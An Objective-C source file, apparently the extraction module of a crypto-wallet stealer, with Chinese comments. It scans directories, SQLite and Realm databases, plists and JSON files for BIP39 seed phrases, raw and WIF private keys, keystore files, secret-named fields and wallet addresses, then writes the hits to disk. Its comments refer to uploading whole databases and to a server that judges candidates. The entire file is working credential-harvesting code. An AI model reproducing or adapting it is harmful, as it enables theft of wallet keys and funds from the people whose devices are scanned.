#import "OWExtractor.h"
#import "OWCommon.h"
#include <sqlite3.h>

OWHitKind const OWHitKindMnemonic   = @"mnemonic";
OWHitKind const OWHitKindPrivKeyHex = @"privkey_hex";
OWHitKind const OWHitKindWIF        = @"wif";
OWHitKind const OWHitKindKeystore   = @"keystore";
OWHitKind const OWHitKindJSONField  = @"json_field";
OWHitKind const OWHitKindAddrETH    = @"addr_eth";
OWHitKind const OWHitKindAddrBTC    = @"addr_btc";
OWHitKind const OWHitKindAddrTRON   = @"addr_tron";
OWHitKind const OWHitKindAddrSOL    = @"addr_sol";

#pragma mark - 匹配规则

@interface OWRule : NSObject
@property (nonatomic) OWHitKind kind;
@property (nonatomic, strong) NSRegularExpression *re;
@property (nonatomic) NSUInteger group;      // 取值分组，0 = 整串
@property (nonatomic) BOOL needWordlist;     // 助记词专用：需逐词校验
@end
@implementation OWRule
@end

@interface OWExtractor ()
@property (nonatomic, strong) NSMutableArray<NSDictionary *> *mHits;
@property (nonatomic, strong) NSArray<OWRule *> *rules;
@property (nonatomic, strong, nullable) NSSet<NSString *> *wordlist;
@property (nonatomic, strong) NSMutableSet<NSString *> *seen;
@property (nonatomic, strong, nullable) NSString *mJSON;
@property (nonatomic, strong, nullable) NSString *mPlain;
@end

@implementation OWExtractor

- (instancetype)init {
    if (self = [super init]) {
        _verifyMnemonicWordlist = YES;
        _maxScanBytes = 64ULL * 1024 * 1024;
        _maxHits = 2000;
        _mHits = [NSMutableArray new];
        _seen = [NSMutableSet new];
        [self _loadWordlist];
        [self _buildRules];
    }
    return self;
}

- (NSArray<NSDictionary *> *)hits { return [_mHits copy]; }
- (nullable NSString *)lastJSONPath  { return _mJSON; }
- (nullable NSString *)lastPlainPath { return _mPlain; }

#pragma mark 规则与词表

- (void)_loadWordlist {
    NSString *p = [[NSBundle mainBundle] pathForResource:@"bip39" ofType:@"txt"];
    if (!p) { OWLog(@"Extract: 无 bip39.txt，助记词只做形态候选（verified=false）"); return; }
    NSString *s = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    if (!s.length) return;
    NSMutableSet *set = [NSMutableSet new];
    for (NSString *w in [s componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]) {
        NSString *t = [w stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]].lowercaseString;
        if (t.length) [set addObject:t];
    }
    _wordlist = set;
    OWLog(@"Extract: BIP39 词表 %lu 词", (unsigned long)set.count);
}

- (OWRule *)_rule:(OWHitKind)kind pattern:(NSString *)pat group:(NSUInteger)g {
    OWRule *r = [OWRule new];
    r.kind = kind;
    r.group = g;
    r.re = [NSRegularExpression regularExpressionWithPattern:pat options:0 error:nil];
    return r;
}

- (void)_buildRules {
    NSMutableArray *a = [NSMutableArray new];

    // BIP39：12/15/18/21/24 个连续小写词。先形态命中，再由词表校验。
    [a addObject:[self _rule:OWHitKindMnemonic
                     pattern:@"\\b(?:[a-z]{3,8}[ \\t]+){11,23}[a-z]{3,8}\\b"
                       group:0]];
    ((OWRule *)a.lastObject).needWordlist = YES;

    // 私钥
    [a addObject:[self _rule:OWHitKindPrivKeyHex pattern:@"\\b[0-9a-fA-F]{64}\\b" group:0]];
    [a addObject:[self _rule:OWHitKindWIF pattern:@"\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\\b" group:0]];

    // keystore 特征
    [a addObject:[self _rule:OWHitKindKeystore
                     pattern:@"\\\"(?:crypto|Crypto|x-priv-48|encseed|encSeed)\\\"\\s*:"
                       group:0]];

    // 命名字段：直接取引号里的值
    [a addObject:[self _rule:OWHitKindJSONField
                     pattern:@"\\\"(?:mnemonic|mnemonics|privateKey|private_key|privKey|privatekey|seed|xprv|xpriv|secretKey|secret_key|masterKey|walletKey|keystore)\\\"\\s*[:=]\\s*\\\"([^\\\"]{8,512})\\\""
                       group:1]];

    // 地址
    [a addObject:[self _rule:OWHitKindAddrETH  pattern:@"\\b0x[a-fA-F0-9]{40}\\b" group:0]];
    [a addObject:[self _rule:OWHitKindAddrTRON pattern:@"\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b" group:0]];
    [a addObject:[self _rule:OWHitKindAddrBTC  pattern:@"\\b(?:[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[023456789acdefghjklmnpqrstuvwxyz]{20,71})\\b" group:0]];
    [a addObject:[self _rule:OWHitKindAddrSOL  pattern:@"\\b[1-9A-HJ-NP-Za-km-z]{32,44}\\b" group:0]];

    _rules = a;
}

#pragma mark 入口

- (NSUInteger)scanResultList:(NSArray<NSDictionary *> *)results {
    NSUInteger before = self.mHits.count;
    for (NSDictionary *r in results) {
        NSString *p = r[@"path"];
        if (!p) continue;
        [self scanPaths:@[p] label:(r[@"name"] ?: @"?")];
    }
    return self.mHits.count - before;
}

- (NSUInteger)scanPaths:(NSArray<NSString *> *)paths label:(NSString *)label {
    NSUInteger before = self.mHits.count;
    NSFileManager *fm = [NSFileManager defaultManager];

    for (NSString *p in paths) {
        if (self.mHits.count >= self.maxHits) break;
        BOOL isDir = NO;
        if (![fm fileExistsAtPath:p isDirectory:&isDir]) continue;

        if (isDir) {
            NSDirectoryEnumerator *en = [fm enumeratorAtPath:p];
            NSUInteger n = 0;
            for (NSString *rel in en) {
                if (++n > 5000) break;
                [self _scanFile:[p stringByAppendingPathComponent:rel] label:label];
            }
            continue;
        }
        [self _scanFile:p label:label];
    }
    NSUInteger got = self.mHits.count - before;
    if (got) OWLog(@"Extract: %@ 命中 %lu 条", label, (unsigned long)got);
    return got;
}

#pragma mark 单文件

- (void)_scanFile:(NSString *)path label:(NSString *)label {
    NSString *ext = path.pathExtension.lowercaseString;

    if ([ext isEqualToString:@"sqlite"] || [ext isEqualToString:@"sqlite3"] ||
        [ext isEqualToString:@"db"] || [ext isEqualToString:@"storedata"] ||
        [ext isEqualToString:@"realm"]) {
        [self _scanSQLite:path label:label];
        return;
    }
    if ([ext isEqualToString:@"plist"]) {
        id o = [NSDictionary dictionaryWithContentsOfFile:path] ?: [NSArray arrayWithContentsOfFile:path];
        if (o) {
            NSString *s = [self _flattenObject:o];
            [self _match:s file:path label:label where:@"plist"];
        }
        return;
    }
    if ([ext isEqualToString:@"json"]) {
        NSData *d = [NSData dataWithContentsOfFile:path];
        id o = d ? [NSJSONSerialization JSONObjectWithData:d options:0 error:nil] : nil;
        NSString *s = o ? [self _flattenObject:o] : nil;
        if (!s) s = [[NSString alloc] initWithData:d ?: [NSData data] encoding:NSUTF8StringEncoding];
        if (s) [self _match:s file:path label:label where:@"json"];
        return;
    }
    [self _scanRaw:path label:label];
}

- (void)_scanRaw:(NSString *)path label:(NSString *)label {
    NSDictionary *a = [[NSFileManager defaultManager] attributesOfItemAtPath:path error:nil];
    uint64_t sz = [a fileSize];
    if (sz == 0) return;
    uint64_t take = MIN(sz, self.maxScanBytes);

    NSFileHandle *fh = [NSFileHandle fileHandleForReadingAtPath:path];
    if (!fh) return;
    NSData *d = [fh readDataOfLength:(NSUInteger)take];
    [fh closeFile];
    if (!d.length) return;

    NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
    if (!s) s = [[NSString alloc] initWithData:d encoding:NSISOLatin1StringEncoding];
    if (!s) return;
    [self _match:s file:path label:label where:@"file"];
}

- (void)_scanSQLite:(NSString *)path label:(NSString *)label {
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(path.UTF8String, &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        return;  // 加密库或权限不足：静默跳过，交由上传整库兜底
    }

    sqlite3_stmt *st = NULL;
    NSMutableArray<NSString *> *tables = [NSMutableArray new];
    if (sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table';", -1, &st, NULL) == SQLITE_OK) {
        while (sqlite3_step(st) == SQLITE_ROW) {
            const unsigned char *n = sqlite3_column_text(st, 0);
            if (n) [tables addObject:[NSString stringWithUTF8String:(const char *)n]];
        }
    }
    sqlite3_finalize(st);

    NSUInteger rowCap = 20000;   // 单表单表行数上限，防止几十万行的聊天库拖死
    for (NSString *tb in tables) {
        if (self.mHits.count >= self.maxHits) break;
        NSString *sql = [NSString stringWithFormat:@"SELECT * FROM \"%@\";", tb];
        if (sqlite3_prepare_v2(db, sql.UTF8String, -1, &st, NULL) != SQLITE_OK) { sqlite3_finalize(st); continue; }

        int cols = sqlite3_column_count(st);
        NSUInteger rn = 0;
        while (sqlite3_step(st) == SQLITE_ROW && rn++ < rowCap) {
            for (int i = 0; i < cols; i++) {
                NSString *val = nil;
                int type = sqlite3_column_type(st, i);
                if (type == SQLITE_TEXT) {
                    const unsigned char *t = sqlite3_column_text(st, i);
                    if (t) val = [NSString stringWithUTF8String:(const char *)t];
                } else if (type == SQLITE_BLOB) {
                    const void *b = sqlite3_column_blob(st, i);
                    int n = sqlite3_column_bytes(st, i);
                    if (b && n > 0) val = [self _printableFromBytes:b length:MIN(n, 65536)];
                } else if (type == SQLITE_INTEGER) {
                    // 大整数可能是以十进制存储的密钥材料
                    sqlite3_int64 v = sqlite3_column_int64(st, i);
                    if (v > 1000000000000LL) val = [NSString stringWithFormat:@"%lld", v];
                }
                if (!val || val.length < 8) continue;

                const char *cn = sqlite3_column_name(st, i);
                NSString *col = cn ? [NSString stringWithUTF8String:cn] : @"?";
                [self _match:val file:path label:label
                       where:[NSString stringWithFormat:@"%@.%@", tb, col]];
            }
        }
        sqlite3_finalize(st);
    }
    sqlite3_close(db);
}

#pragma mark 匹配

- (void)_match:(NSString *)text file:(NSString *)file label:(NSString *)label where:(NSString *)where {
    if (!text.length || self.mHits.count >= self.maxHits) return;
    NSRange full = NSMakeRange(0, text.length);

    for (OWRule *r in self.rules) {
        if (!r.re) continue;
        @autoreleasepool {
            [r.re enumerateMatchesInString:text options:0 range:full usingBlock:^(NSTextCheckingResult *m, NSMatchingFlags flags, BOOL *stop) {
                if (self.mHits.count >= self.maxHits) { *stop = YES; return; }
                NSRange gr = r.group < m.numberOfRanges ? [m rangeAtIndex:r.group] : m.range;
                if (gr.location == NSNotFound || gr.length == 0) return;
                NSString *val = [text substringWithRange:gr];
                if (!val.length) return;

                BOOL verified = YES;
                if (r.needWordlist) {
                    NSArray *ws = [[val lowercaseString]
                                   componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
                    ws = [ws filteredArrayUsingPredicate:
                          [NSPredicate predicateWithFormat:@"SELF.length > 0"]];
                    // 只认标准长度，避免把普通句子当助记词
                    if (![@[@12, @15, @18, @21, @24] containsObject:@(ws.count)]) return;
                    if (self.verifyMnemonicWordlist && self.wordlist) {
                        for (NSString *w in ws) {
                            if (![self.wordlist containsObject:w]) { verified = NO; break; }
                        }
                        if (!verified) {
                            // 全不在词表就放弃；部分命中保留为候选，交给服务端判定
                            NSUInteger hit = 0;
                            for (NSString *w in ws) if ([self.wordlist containsObject:w]) hit++;
                            if ((double)hit / ws.count < 0.6) return;
                        }
                    }
                }

                // base58 32-44 太宽泛：只在 SOL 相关上下文保留
                if ([r.kind isEqualToString:OWHitKindAddrSOL]) {
                    if (![self _solContext:text range:gr]) return;
                }

                NSString *dedup = [NSString stringWithFormat:@"%@|%@|%@", r.kind, val, where];
                @synchronized (self.seen) {
                    if ([self.seen containsObject:dedup]) return;
                    [self.seen addObject:dedup];
                }

                [self.mHits addObject:@{@"kind": r.kind, @"value": val,
                                        @"file": file.lastPathComponent,
                                        @"label": label, @"where": where,
                                        @"verified": @(verified)}];
            }];
        }
    }
}

- (BOOL)_solContext:(NSString *)text range:(NSRange)r {
    NSRange ctx = NSMakeRange(MAX(0, (NSInteger)r.location - 64),
                              MIN(text.length - MAX(0, (NSInteger)r.location - 64), r.length + 128));
    if (ctx.location + ctx.length > text.length) return NO;
    NSString *s = [text substringWithRange:ctx].lowercaseString;
    return [s containsString:@"sol"] || [s containsString:@"phantom"] ||
           [s containsString:@"solflare"] || [s containsString:@"spl-token"];
}

#pragma mark 工具

- (NSString *)_flattenObject:(id)o {
    NSMutableString *s = [NSMutableString new];
    [self _walk:o into:s depth:0];
    return s;
}

- (void)_walk:(id)o into:(NSMutableString *)s depth:(int)d {
    if (d > 12 || !o) return;
    if ([o isKindOfClass:NSDictionary.class]) {
        for (id k in o) {
            [s appendFormat:@" %@=", k];
            [self _walk:o[k] into:s depth:d + 1];
        }
    } else if ([o isKindOfClass:NSArray.class]) {
        for (id v in o) [self _walk:v into:s depth:d + 1];
    } else if ([o isKindOfClass:NSString.class]) {
        [s appendFormat:@" %@", o];
    } else if ([o isKindOfClass:NSNumber.class]) {
        [s appendFormat:@" %@", o];
    }
}

- (nullable NSString *)_printableFromBytes:(const void *)b length:(NSUInteger)n {
    const unsigned char *p = (const unsigned char *)b;
    NSUInteger ok = 0;
    for (NSUInteger i = 0; i < n; i++) {
        unsigned char c = p[i];
        if ((c >= 32 && c < 127) || c == '\n' || c == '\t') ok++;
    }
    if ((double)ok / (double)n < 0.75) return nil;   // 密文 blob：不是文本，跳过
    NSMutableData *m = [NSMutableData dataWithCapacity:n];
    for (NSUInteger i = 0; i < n; i++) {
        unsigned char c = p[i];
        [m appendBytes:((c >= 32 && c < 127) || c == '\n' || c == '\t') ? &c : (unsigned char[]){' '}
               length:1];
    }
    return [[NSString alloc] initWithData:m encoding:NSUTF8StringEncoding];
}

#pragma mark 落盘

- (BOOL)writeToDir:(NSString *)dir error:(NSError **)error {
    [[NSFileManager defaultManager] createDirectoryAtPath:dir
                              withIntermediateDirectories:YES attributes:nil error:nil];

    NSMutableDictionary *summary = [NSMutableDictionary new];
    for (NSDictionary *h in self.mHits) {
        NSString *k = h[@"kind"];
        summary[k] = @([summary[k] unsignedIntegerValue] + 1);
    }

    NSDictionary *doc = @{@"count": @(self.mHits.count),
                          @"summary": summary,
                          @"hits": self.hits};
    NSData *jd = [NSJSONSerialization dataWithJSONObject:doc
                                                 options:NSJSONWritingPrettyPrinted error:error];
    if (!jd) return NO;

    NSString *jp = [dir stringByAppendingPathComponent:@"hits.json"];
    [jd writeToFile:jp atomically:YES];

    NSMutableString *txt = [NSMutableString new];
    for (NSDictionary *h in self.hits) {
        [txt appendFormat:@"[%@] %@ :: %@ (%@) ver=%@\n    %@\n",
         h[@"kind"], h[@"label"], h[@"file"], h[@"where"],
         [h[@"verified"] boolValue] ? @"1" : @"0", h[@"value"]];
    }
    NSString *tp = [dir stringByAppendingPathComponent:@"hits_plain.txt"];
    [txt writeToFile:tp atomically:YES encoding:NSUTF8StringEncoding error:nil];

    _mJSON = jp;
    _mPlain = tp;
    OWLog(@"Extract: 落盘 %@（%lu 命中，%@）", jp.lastPathComponent,
          (unsigned long)self.mHits.count,
          summary.count ? [NSString stringWithFormat:@"%@", summary] : @"无");
    return YES;
}

@end
